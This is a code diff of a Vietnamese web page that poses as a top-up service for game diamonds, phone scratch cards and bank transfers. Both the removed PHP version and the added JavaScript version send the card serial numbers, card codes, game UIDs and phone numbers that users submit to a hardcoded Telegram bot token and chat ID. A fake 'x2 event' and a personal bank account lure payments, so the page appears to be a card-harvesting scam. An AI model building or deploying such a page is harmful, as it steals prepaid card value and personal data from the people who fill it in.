@@ -1,327 +1,232 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nạp Thẻ Garena, Thẻ Điện Thoại & Chuyển Khoản Ngân Hàng</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-        body { 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
-            min-height: 100vh; 
-            font-family: 'Segoe UI', sans-serif;
-        }
-        .card { 
-            border-radius: 20px; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.4); 
-            background: rgba(255,255,255,0.95);
-        }
-        .form-control, .form-select { border-radius: 12px; }
-        .btn-nap { 
-            background: #ff6b00; 
-            border: none; 
-            font-weight: bold; 
-            padding: 14px; 
-            border-radius: 12px;
-            font-size: 1.1rem;
-        }
-        .btn-nap:hover { background: #e55a00; }
-        .btn-nap:disabled { background: #ccc; cursor: not-allowed; }
-        header { background: rgba(0,0,0,0.8); border-radius: 0 0 20px 20px; }
-        .type-section { display: none; }
-        .type-section.active { display: block; }
-        .bank-info { background: #f8f9fa; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
-        .loading-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-        }
-        .spinner { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid #ff6b00; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nạp KC Game</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+<style>
+body{
+    background:linear-gradient(135deg,#141e30,#243b55);
+    min-height:100vh;
+    font-family:'Segoe UI',sans-serif
+}
+header{background:rgba(0,0,0,.75)}
+.card{
+    border-radius:18px;
+    box-shadow:0 20px 40px rgba(0,0,0,.5)
+}
+.type{display:none}
+.type.active{display:block}
+.btn-nap{
+    background:#ff6b00;
+    border:none;
+    font-weight:700;
+    padding:14px;
+    font-size:1.1rem;
+    border-radius:12px
+}
+.btn-nap:disabled{background:#999}
+.loading{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.7);
+    align-items:center;
+    justify-content:center;
+    z-index:999
+}
+.spinner{
+    width:60px;height:60px;
+    border:6px solid #eee;
+    border-top:6px solid #ff6b00;
+    border-radius:50%;
+    animation:spin 1s linear infinite
+}
+@keyframes spin{100%{transform:rotate(360deg)}}
+.stat-box{
+    background:#0d6efd;
+    color:#fff;
+    padding:10px;
+    border-radius:10px;
+    text-align:center;
+    font-weight:700
+}
+</style>
 </head>
+
 <body>
-    <header class="py-4 text-white text-center">
-        <h1 class="display-5 fw-bold">NẠP THẺ GARENA - THẺ ĐIỆN THOẠI - NGÂN HÀNG</h1>
-        <p class="lead mb-0">Uy tín 24/7 - Chiết khấu cao nhất</p>
-    </header>
 
-    <div class="container my-5">
-        <div class="row justify-content-center">
-            <div class="col-lg-6 col-md-8 col-sm-10">
-                <div class="card p-4 p-md-5">
-                    <h3 class="text-center mb-4 text-danger fw-bold">FORM NẠP TIỀN</h3>
+<header class="py-4 text-white text-center">
+<h1 class="fw-bold">NẠP KC GAME</h1>
+<p>Uy tín 24/7 • Xử lý nhanh • KC tự động</p>
+</header>
 
-                    <?php
-                    // === CẤU HÌNH TELEGRAM ===
-                    $BOT_TOKEN = '8301552072:AAE8XG6Azgud5GVtYPrvvLo04HE8F_9ZN2c';
-                    $CHAT_ID   = '5903999893';
+<div class="container my-4">
+<div class="stat-box mb-3">
+📊 Tổng KC hôm nay: <span id="totalKC">0</span> KC
+</div>
 
-                    // === THÔNG TIN TÀI KHOẢN NGÂN HÀNG (thay bằng thông tin thật của bạn) ===
-                    $bank_accounts = [
-                        'MSB' => ['stk' => '0971361106', 'name' => 'TRUONG HUYNH NHU', 'qr' => ''],
-                        'MSB'        => ['stk' => '0971361106', 'name' => 'TRUONG HUYNH NHU', 'qr' => ''],
-                        'MSB'      => ['stk' => '0971361106', 'name' => 'TRUONG HUYNH NHU', 'qr' => '']
-                    ];
+<div class="row justify-content-center">
+<div class="col-md-6">
 
-                    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-                        $loai_nap = htmlspecialchars($_POST['loai_nap'] ?? '');
+<div class="card p-4">
+<h4 class="text-center text-warning fw-bold mb-3">FORM NẠP KC</h4>
 
-                        // Thu thập dữ liệu chung
-                        $menhgia_or_sotien = '';
-                        $seri = $mathe = '';
-                        $nhamang = $sdt = $uid_garena = '';
-                        $bank_info = $noidung_ck = $ten_nguoi_ck = '';
+<div class="text-center mb-3">
+<span class="badge bg-danger" id="eventText">🎁 EVENT X2 KC ĐANG BẬT</span>
+</div>
 
-                        if ($loai_nap === 'garena' || $loai_nap === 'dienthoai') {
-                            $menhgia_or_sotien = htmlspecialchars($_POST['menhgia'] ?? '');
-                            $seri              = htmlspecialchars($_POST['seri'] ?? '');
-                            $mathe             = htmlspecialchars($_POST['mathe'] ?? '');
-                            if ($loai_nap === 'dienthoai') {
-                                $nhamang = htmlspecialchars($_POST['nhamang'] ?? '');
-                                $sdt     = htmlspecialchars($_POST['sdt'] ?? '');
-                            } else {
-                                $uid_garena = htmlspecialchars($_POST['uid_garena'] ?? '');
-                            }
-                        } elseif ($loai_nap === 'bank') {
-                            $menhgia_or_sotien = htmlspecialchars($_POST['sotien'] ?? '');
-                            $bank_info        = htmlspecialchars($_POST['bank_chosen'] ?? '');
-                            $noidung_ck       = htmlspecialchars($_POST['noidung_ck'] ?? '');
-                            $ten_nguoi_ck     = htmlspecialchars($_POST['ten_nguoi_ck'] ?? '');
-                            $nhamang          = htmlspecialchars($_POST['nhamang_bank'] ?? '');
-                            $sdt              = htmlspecialchars($_POST['sdt_bank'] ?? '');
-                            $uid_garena       = htmlspecialchars($_POST['uid_bank'] ?? '');
-                        }
+<form id="napForm">
 
-                        // Kiểm tra dữ liệu cơ bản
-                        if (empty($loai_nap)) {
-                            echo '<div class="alert alert-danger text-center">Vui lòng chọn loại nạp!</div>';
-                        } else {
-                            $message = "🔔 ĐƠN NẠP MỚI\n\n";
-                            if ($loai_nap === 'garena') {
-                                $message .= "Loại: Thẻ Garena\nUID: $uid_garena\n";
-                            } elseif ($loai_nap === 'dienthoai') {
-                                $message .= "Loại: Thẻ Điện Thoại ($nhamang)\nSĐT: $sdt\n";
-                            } elseif ($loai_nap === 'bank') {
-                                $message .= "Loại: Chuyển khoản Ngân hàng\nNgân hàng chuyển: $bank_info\nNội dung CK: $noidung_ck\nTên người chuyển: $ten_nguoi_ck\n";
-                                if (!empty($uid_garena)) $message .= "Nạp Garena UID: $uid_garena\n";
-                                if (!empty($sdt)) $message .= "Nạp ĐT $nhamang - SĐT: $sdt\n";
-                            }
+<div class="btn-group w-100 mb-3">
+<input type="radio" class="btn-check" name="type" id="garena" checked>
+<label class="btn btn-outline-primary" for="garena">Garena</label>
 
-                            if ($loai_nap !== 'bank') {
-                                $message .= "Mệnh giá: $menhgia_or_sotien VNĐ\nSeri: $seri\nMã thẻ: $mathe\n";
-                            } else {
-                                $message .= "Số tiền: $menhgia_or_sotien VNĐ\n";
-                            }
+<input type="radio" class="btn-check" name="type" id="dienthoai">
+<label class="btn btn-outline-primary" for="dienthoai">Điện Thoại</label>
 
-                            $message .= "Thời gian: " . date('d/m/Y H:i:s') . "\n";
-                            $message .= "IP khách: " . $_SERVER['REMOTE_ADDR'];
+<input type="radio" class="btn-check" name="type" id="bank">
+<label class="btn btn-outline-primary" for="bank">Ngân Hàng</label>
+</div>
 
-                            // Gửi Telegram
-                            $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage";
-                            $data = [
-                                'chat_id'    => $CHAT_ID,
-                                'text'       => $message,
-                                'parse_mode' => 'HTML'
-                            ];
-                            $options = [
-                                'http' => [
-                                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-                                    'method'  => 'POST',
-                                    'content' => http_build_query($data)
-                                ]
-                            ];
-                            $context = stream_context_create($options);
-                            file_get_contents($url, false, $context);
+<div id="menhgia" class="type active">
+<select class="form-select mb-2" id="menhgiaVal">
+<option value="">-- Chọn mệnh giá --</option>
+<option>10000</option>
+<option>20000</option>
+<option>50000</option>
+<option>100000</option>
+<option>200000</option>
+<option>500000</option>
+</select>
+<input class="form-control fw-bold text-success" id="kc" disabled placeholder="KC nhận được">
+</div>
 
-                            echo '<div class="alert alert-success text-center fw-bold">Đơn nạp đã gửi thành công!<br>Admin sẽ xử lý trong vài phút. Cảm ơn bạn!</div>';
-                        }
-                    }
-                    ?>
+<div id="card" class="type active">
+<input class="form-control mb-2" id="seri" placeholder="Số Seri">
+<input class="form-control mb-2" id="mathe" placeholder="Mã thẻ">
+</div>
 
-                    <form method="POST" action="" id="napForm">
-                        <!-- Chọn loại nạp -->
-                        <div class="mb-4 text-center">
-                            <div class="btn-group w-100" role="group">
-                                <input type="radio" class="btn-check" name="loai_nap" id="garena" value="garena" checked>
-                                <label class="btn btn-outline-primary" for="garena">Thẻ Garena</label>
+<div id="garenaBox" class="type active">
+<input class="form-control mb-2" id="uid" placeholder="UID Garena">
+</div>
 
-                                <input type="radio" class="btn-check" name="loai_nap" id="dienthoai" value="dienthoai">
-                                <label class="btn btn-outline-primary" for="dienthoai">Thẻ Điện Thoại</label>
+<div id="phoneBox" class="type">
+<select class="form-select mb-2" id="nhamang">
+<option>Viettel</option>
+<option>Mobifone</option>
+<option>Vinaphone</option>
+</select>
+<input class="form-control mb-2" id="sdt" placeholder="Số điện thoại">
+</div>
 
-                                <input type="radio" class="btn-check" name="loai_nap" id="bank" value="bank">
-                                <label class="btn btn-outline-primary rounded-end" for="bank">Ngân Hàng</label>
-                            </div>
-                        </div>
+<div id="bankBox" class="type">
+<input class="form-control mb-2" id="sotien" placeholder="Số tiền">
+<input class="form-control mb-2" id="bankname" placeholder="Ngân hàng chuyển">
+<input class="form-control mb-2" id="noidung" placeholder="Nội dung CK">
+<input class="form-control mb-2" id="tenck" placeholder="Tên người chuyển">
+</div>
 
-                        <!-- Phần chung: Mệnh giá (thẻ) hoặc Số tiền (bank) -->
-                        <div id="menhgia-section" class="type-section active">
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">Mệnh giá</label>
-                                <select name="menhgia" class="form-select" required>
-                                    <option value="">-- Chọn mệnh giá --</option>
-                                    <option value="10000">10.000 VNĐ</option>
-                                    <option value="20000">20.000 VNĐ</option>
-                                    <option value="50000">50.000 VNĐ</option>
-                                    <option value="100000">100.000 VNĐ</option>
-                                    <option value="200000">200.000 VNĐ</option>
-                                    <option value="500000">500.000 VNĐ</option>
-                                </select>
-                            </div>
-                        </div>
+<button class="btn btn-nap text-white w-100 mt-2" id="submitBtn">
+GỬI ĐƠN NẠP
+</button>
+</form>
 
-                        <div id="sotien-section" class="type-section">
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">Số tiền nạp (VNĐ)</label>
-                                <input type="number" name="sotien" class="form-control" placeholder="Nhập số tiền (ví dụ: 100000)" min="10000" required>
-                            </div>
-                        </div>
+</div>
+</div>
+</div>
+</div>
 
-                        <!-- Seri & Mã thẻ (chỉ thẻ cào) -->
-                        <div id="seri-mathe-section" class="type-section active">
-                            <div class="row">
-                                <div class="col-md-6 mb-3">
-                                    <label class="form-label fw-bold">Số Seri</label>
-                                    <input type="text" name="seri" class="form-control" placeholder="Nhập seri" required>
-                                </div>
-                                <div class="col-md-6 mb-3">
-                                    <label class="form-label fw-bold">Mã thẻ</label>
-                                    <input type="text" name="mathe" class="form-control" placeholder="Nhập mã thẻ" required>
-                                </div>
-                            </div>
-                        </div>
+<div class="loading" id="loading"><div class="spinner"></div></div>
 
-                        <!-- Phần Garena (thẻ cào) -->
-                        <div id="section-garena" class="type-section active">
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">UID Garena</label>
-                                <input type="text" name="uid_garena" class="form-control" placeholder="Nhập UID Garena" required>
-                            </div>
-                        </div>
+<script>
+/* ===== CONFIG ===== */
+const BOT_TOKEN = "8301552072:AAE8XG6Azgud5GVtYPrvvLo04HE8F_9ZN2c";
+const CHAT_ID  = "5903999893";
+const KC_RATE  = 60;
+const EVENT_X2 = true;
+const COOLDOWN = 60000;
 
-                        <!-- Phần Điện thoại (thẻ cào) -->
-                        <div id="section-dienthoai" class="type-section">
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">Nhà mạng</label>
-                                <select name="nhamang" class="form-select" required>
-                                    <option value="">-- Chọn nhà mạng --</option>
-                                    <option value="Viettel">Viettel</option>
-                                    <option value="Mobifone">Mobifone</option>
-                                    <option value="Vinaphone">Vinaphone</option>
-                                    <option value="Vietnamobile">Vietnamobile</option>
-                                </select>
-                            </div>
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">Số điện thoại</label>
-                                <input type="text" name="sdt" class="form-control" placeholder="Nhập SĐT nhận tiền" required>
-                            </div>
-                        </div>
+/* ===== EVENT TEXT ===== */
+if(!EVENT_X2) document.getElementById("eventText").style.display="none";
 
-                        <!-- Phần Ngân hàng -->
-                        <div id="section-bank" class="type-section">
-                            <div class="bank-info">
-                                <h5 class="text-center mb-3">Thông tin chuyển khoản</h5>
-                                <?php foreach ($bank_accounts as $bank => $info): ?>
-                                    <p class="mb-2"><strong><?php echo $bank; ?></strong><br>
-                                    STK: <?php echo $info['stk']; ?><br>
-                                    Chủ TK: <?php echo $info['name']; ?></p>
-                                    <hr class="my-2">
-                                <?php endforeach; ?>
-                                <small class="text-danger">Vui lòng chuyển đúng nội dung để được nạp nhanh!</small>
-                            </div>
+/* ===== STATS ===== */
+const today = new Date().toLocaleDateString();
+let stats = JSON.parse(localStorage.kcStats || "{}");
+if(stats.date !== today) stats = {date:today,total:0};
+totalKC.innerText = stats.total;
 
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">Ngân hàng bạn chuyển</label>
-                                <input type="text" name="bank_chosen" class="form-control" placeholder="Ví dụ: MBBank, Vietcombank..." required>
-                            </div>
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">Nội dung chuyển khoản</label>
-                                <input type="text" name="noidung_ck" class="form-control" placeholder="Nội dung CK (bắt buộc)" required>
-                            </div>
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">Tên người chuyển</label>
-                                <input type="text" name="ten_nguoi_ck" class="form-control" placeholder="Tên chủ tài khoản chuyển" required>
-                            </div>
+/* ===== UI SWITCH ===== */
+const show=(...ids)=>{
+document.querySelectorAll('.type').forEach(e=>e.classList.remove('active'));
+ids.forEach(id=>document.getElementById(id).classList.add('active'));
+};
+garena.onclick=()=>show('menhgia','card','garenaBox');
+dienthoai.onclick=()=>show('menhgia','card','phoneBox');
+bank.onclick=()=>show('bankBox');
 
-                            <hr>
-                            <p class="text-center mb-3"><strong>Nạp vào tài khoản nào?</strong></p>
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">UID Garena (nếu nạp Garena)</label>
-                                <input type="text" name="uid_bank" class="form-control" placeholder="Để trống nếu không nạp Garena">
-                            </div>
-                            <div class="mb-3">
-                                <label class="form-label fw-bold">Nhà mạng & SĐT (nếu nạp thẻ ĐT)</label>
-                                <select name="nhamang_bank" class="form-select mb-2">
-                                    <option value="">-- Không nạp thẻ ĐT --</option>
-                                    <option value="Viettel">Viettel</option>
-                                    <option value="Mobifone">Mobifone</option>
-                                    <option value="Vinaphone">Vinaphone</option>
-                                </select>
-                                <input type="text" name="sdt_bank" class="form-control" placeholder="SĐT nhận tiền (nếu chọn nhà mạng)">
-                            </div>
-                        </div>
+/* ===== KC CALC ===== */
+menhgiaVal.onchange=()=>{
+let v=parseInt(menhgiaVal.value||0);
+let kcVal=(v/10000)*KC_RATE;
+if(EVENT_X2) kcVal*=2;
+kc.value = kcVal ? kcVal+" KC" : "";
+};
 
-                        <!-- Nút nạp -->
-                        <div class="text-center mt-4">
-                            <button type="submit" class="btn btn-nap btn-lg text-white w-100" id="submitBtn">NẠP NGAY</button>
-                        </div>
-                    </form>
+/* ===== VALIDATE ===== */
+function validCard(s,m){
+return /^[0-9]{10,15}$/.test(s)&&/^[0-9]{10,15}$/.test(m);
+}
 
-                    <div class="mt-4 text-center text-muted small">
-                        <p>Hệ thống nạp thủ công 24/7 - Admin xử lý nhanh trong 1-5 phút.<br>
-                        Liên hệ: Telegram @yourusername</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+/* ===== SUBMIT ===== */
+napForm.onsubmit=async e=>{
+e.preventDefault();
 
-    <!-- Loading overlay -->
-    <div class="loading-overlay" id="loading">
-        <div class="spinner"></div>
-    </div>
+if(!bank.checked && !validCard(seri.value,mathe.value)){
+alert("❌ Seri hoặc mã thẻ không hợp lệ!");
+return;
+}
 
-    <script>
-        // Toggle sections
-        document.querySelectorAll('input[name="loai_nap"]').forEach(radio => {
-            radio.addEventListener('change', function() {
-                // Ẩn tất cả
-                document.querySelectorAll('.type-section').forEach(sec => sec.classList.remove('active'));
+if(localStorage.lastSend && Date.now()-localStorage.lastSend<COOLDOWN){
+alert("⛔ Vui lòng chờ trước khi gửi tiếp!");
+return;
+}
 
-                if (this.value === 'garena') {
-                    document.getElementById('menhgia-section').classList.add('active');
-                    document.getElementById('seri-mathe-section').classList.add('active');
-                    document.getElementById('section-garena').classList.add('active');
-                    document.getElementById('sotien-section').classList.remove('active');
-                    document.getElementById('section-bank').classList.remove('active');
-                } else if (this.value === 'dienthoai') {
-                    document.getElementById('menhgia-section').classList.add('active');
-                    document.getElementById('seri-mathe-section').classList.add('active');
-                    document.getElementById('section-dienthoai').classList.add('active');
-                    document.getElementById('sotien-section').classList.remove('active');
-                    document.getElementById('section-bank').classList.remove('active');
-                    document.getElementById('section-garena').classList.remove('active');
-                } else if (this.value === 'bank') {
-                    document.getElementById('sotien-section').classList.add('active');
-                    document.getElementById('section-bank').classList.add('active');
-                    document.getElementById('menhgia-section').classList.remove('active');
-                    document.getElementById('seri-mathe-section').classList.remove('active');
-                    document.getElementById('section-garena').classList.remove('active');
-                    document.getElementById('section-dienthoai').classList.remove('active');
-                }
-            });
-        });
+loading.style.display="flex";
+submitBtn.disabled=true;
 
-        // Hiệu ứng loading khi submit
-        document.getElementById('napForm').addEventListener('submit', function() {
-            document.getElementById('loading').style.display = 'flex';
-            document.getElementById('submitBtn').disabled = true;
-            document.getElementById('submitBtn').innerHTML = 'ĐANG XỬ LÝ...';
-        });
-    </script>
+let kcNhan=parseInt(kc.value)||0;
+stats.total+=kcNhan;
+localStorage.kcStats=JSON.stringify(stats);
+totalKC.innerText=stats.total;
+
+let msg=
+`🔔 ĐƠN NẠP MỚI
+━━━━━━━━━━━━
+📌 Loại: ${garena.checked?"Garena":dienthoai.checked?"Điện Thoại":"Ngân Hàng"}
+💰 Mệnh giá: ${menhgiaVal.value||sotien.value}
+💎 KC nhận: ${kcNhan}
+🎁 Event x2: ${EVENT_X2?"CÓ":"KHÔNG"}
+🧾 Seri: ${seri.value||"—"}
+🎫 Mã thẻ: ${mathe.value||"—"}
+👤 UID: ${uid.value||"—"}
+📱 SĐT: ${sdt.value||"—"}
+⏰ ${new Date().toLocaleString()}
+━━━━━━━━━━━━`;
+
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+method:"POST",
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({chat_id:CHAT_ID,text:msg})
+});
+
+localStorage.lastSend=Date.now();
+alert("✅ Gửi đơn thành công!");
+location.reload();
+};
+</script>
+
 </body>
-                                      </html>
+    </html>
